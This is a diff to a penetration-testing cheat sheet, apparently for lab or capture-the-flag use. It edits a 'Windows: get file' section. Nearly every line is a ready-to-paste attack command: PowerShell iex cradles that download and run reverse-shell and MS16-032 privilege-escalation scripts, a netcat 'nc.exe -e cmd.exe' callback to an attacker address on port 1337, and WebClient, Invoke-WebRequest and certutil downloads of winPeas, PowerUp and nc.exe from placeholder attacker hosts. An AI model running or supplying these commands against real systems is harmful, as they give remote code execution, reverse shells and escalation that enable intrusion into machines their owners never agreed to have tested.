@@ -272,15 +272,16 @@
 - findstr = grep
 - 
 ### Windows: get file
-  - powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+  - powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
+    - C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
+
+  - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://Attcker/File
   
-  - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://**IP_ATTACKER/FIlE**
-  
-  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://1**IP_ATTACKER/FIlE**', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')" = Load the script
+  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://Attcker/File', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')" = Load the script
   
   - iex(New-Object Net.WebClient).DownloadString("http://10.9.1.255:80/PowerUp.ps1")dir
 
-  - powershell -c wget "h**IP_ATTACKER/FIlE** -outfile "PowerUp.ps1"
+  - powershell -c wget "http://Attcker/File -outfile "PowerUp.ps1"
 
   - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
   
